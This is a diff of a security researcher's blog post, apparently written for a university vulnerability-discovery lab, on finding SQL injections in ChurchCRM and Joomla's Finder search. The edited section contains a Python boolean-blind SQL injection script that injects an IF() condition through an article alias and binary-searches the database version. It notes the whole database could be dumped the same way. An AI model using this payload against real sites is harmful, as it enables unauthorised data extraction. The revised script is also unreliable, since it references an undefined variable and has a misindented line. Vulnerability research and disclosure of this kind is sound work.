@@ -10,7 +10,7 @@ published: "2026-06-13"
 
 # A Random PHP Detour
 
-This whole journey started when I randomly found a **CRM** repository written in **PHP** for managing churches called [ChurchCRM](https://github.com/ChurchCRM/CRM). The [GitHub advisory history](https://github.com/ChurchCRM/CRM/security/advisories) already had a couple of interesting vulnerabilities, including several **SQL injections**, **XSS** issues, and other typical web application bugs. After taking a closer look at the **SQL injection** advisories, the vulnerable code looked fairly simple to me, including some textbook **SQL injections**. So I became curious whether there were more **SQL** related issues in this repository and looked at how the application interacts with the database. In [ChurchCRM 7.0.5](https://github.com/ChurchCRM/CRM/blob/7.0.5/) this turned out to be quite easy. A lot of legacy code constructs raw **SQL** strings and then passes them into the `RunQuery` function, which delegates the query execution to the underlying database. That gives you a pretty simple source-to-sink search strategy. By searching for `RunQuery` and inspecting the code that constructs the **SQL** query, you can manually trace all the relevant variables backwards. One representative example is the vulnerable code in [ChurchCRM 7.0.5 SettingsUser.php](https://github.com/ChurchCRM/CRM/blob/7.0.5/src/SettingsUser.php#L14-L47):
+The main reason I started hunting for CVEs was the [Real-world Vulnerability Discovery and Exploits](https://intellisec.de/teaching/2026-ss/exploits/) practical lab at my univesity KIT which you only pass if you got a CVE assigned or a bug bounty payed out. While looking for a target for the lab, I randomly found a **CRM** repository written in **PHP** for managing churches called [ChurchCRM](https://github.com/ChurchCRM/CRM). The [GitHub advisory history](https://github.com/ChurchCRM/CRM/security/advisories) already had a couple of interesting vulnerabilities, including several **SQL injections**, **XSS** issues, and other typical web application bugs. After taking a closer look at the **SQL injection** advisories, the vulnerable code looked fairly simple to me, including some textbook **SQL injections**. So I became curious whether there were more **SQL** related issues in this repository and looked at how the application interacts with the database. In [ChurchCRM 7.0.5](https://github.com/ChurchCRM/CRM/blob/7.0.5/) this turned out to be quite easy. A lot of legacy code constructs raw **SQL** strings and then passes them into the `RunQuery` function, which delegates the query execution to the underlying database. That gives you a pretty simple source-to-sink search strategy. By searching for `RunQuery` and inspecting the code that constructs the **SQL** query, you can manually trace all the relevant variables backwards. One representative example is the vulnerable code in [ChurchCRM 7.0.5 SettingsUser.php](https://github.com/ChurchCRM/CRM/blob/7.0.5/src/SettingsUser.php#L14-L47):
 
 ```php
 if (isset($_POST['save'])) {
@@ -326,36 +326,33 @@ The `False` condition returns nothing through the search filter after creating a
 
 ![Finder search returning no results for the false SQL condition](blog/posts/joomla-sqli/finder-search-false-browser.png "Finder false condition")
 
-The very simplified extraction script to dump the database table names looks like this:
+The very simplified extraction script to get the database version looks like this:
 
 ```python
-def cond(table_offset, pos, mid):
-    return (
-        "ASCII(SUBSTRING((SELECT table_name "
-        "FROM information_schema.tables "
-        "WHERE table_schema=DATABASE() "
-        f"ORDER BY table_name LIMIT 1 OFFSET {table_offset}),{pos},1))>={mid}"
-    )
+def cond(pos, mid):
+    return f"ASCII(SUBSTRING(VERSION(),{pos},1))>={mid}"
 
 for pos in range(1, 65):
     lo, hi = 0, 127
+    title = "1337"
     prefix = "13371337"
-    search_term = "1337"
 
     while lo < hi:
         mid = (lo + hi + 1) // 2
-        alias_payload = f"{prefix}*0+IF(({cond(0, pos, mid)}),t.node_id,0)"
-
-        save_article_created_by_alias(alias_payload)
-        ok = finder_search_returns_results(f"{search_term} author:{prefix}")
+        alias_payload = f"{prefix}*0+IF(({cond(pos, mid)}),t.node_id,0)"
+        create_or_edit_article(session, article, title, alias_payload)
+        ok = probe(prefix, term)
 
         if ok:
             lo = mid
         else:
             hi = mid - 1
+
+     if lo == 0:
+        break
 ```
 
-`search_term` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter. Then we can do a **binary search** to extract table names character by character through the **boolean oracle**.
+`title` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter. Then we can do a **binary search** to extract the database version character by character through the **boolean oracle**. Besides dumping the database version, we could also dump the whole database by enumerating all the available tables.
 
 # The Fix
 
